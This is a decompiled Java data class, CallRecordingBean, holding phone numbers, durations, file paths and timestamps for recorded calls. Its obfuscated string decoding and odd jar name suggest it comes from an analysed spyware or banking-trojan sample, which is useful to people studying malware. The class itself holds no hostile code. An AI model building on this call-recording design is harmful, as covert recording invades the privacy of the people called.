package com.wish.lmbank.bean;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/bean/CallRecordingBean.class */
public class CallRecordingBean {
    private long createtime;
    private long duration;
    private int id;
    private String path;
    private String phoneNumber;
    private String status;
    private String type;
    private long updatetime;

    public int getId() {
        return this.id;
    }

    public void setId(int i) {
        this.id = i;
    }

    public String getType() {
        return this.type;
    }

    public void setType(String str) {
        this.type = str;
    }

    public String getPhoneNumber() {
        return this.phoneNumber;
    }

    public void setPhoneNumber(String str) {
        this.phoneNumber = str;
    }

    public long getDuration() {
        return this.duration;
    }

    public void setDuration(long j) {
        this.duration = j;
    }

    public String getPath() {
        return this.path;
    }

    public void setPath(String str) {
        this.path = str;
    }

    public long getCreatetime() {
        return this.createtime;
    }

    public void setCreatetime(long j) {
        this.createtime = j;
    }

    public long getUpdatetime() {
        return this.updatetime;
    }

    public void setUpdatetime(long j) {
        this.updatetime = j;
    }

    public String getStatus() {
        return this.status;
    }

    public void setStatus(String str) {
        this.status = str;
    }

    public String toString() {
//         return bb7d7pu7.m5998("KggFBTsMCgYbDQAHDisMCAcSAA1U") + this.id + bb7d7pu7.m5998("RUkdEBkMVE4") + this.type + '\'' + bb7d7pu7.m5998("RUkZAQYHDCccBAsMG1RO") + this.phoneNumber + '\'' + bb7d7pu7.m5998("RUkNHBsIHQAGB1Q") + this.duration + bb7d7pu7.m5998("RUkZCB0BVE4") + this.path + '\'' + bb7d7pu7.m5998("RUkKGwwIHQwdAAQMVA") + this.createtime + bb7d7pu7.m5998("RUkcGQ0IHQwdAAQMVA") + this.updatetime + bb7d7pu7.m5998("RUkaHQgdHBpUTg") + this.status + "'}";
        return "CallRecordingBean{id=" + this.id + ", type='" + this.type + '\'' + ", phoneNumber='" + this.phoneNumber + '\'' + ", duration=" + this.duration + ", path='" + this.path + '\'' + ", createtime=" + this.createtime + ", updatetime=" + this.updatetime + ", status='" + this.status + "'}";
    }
}
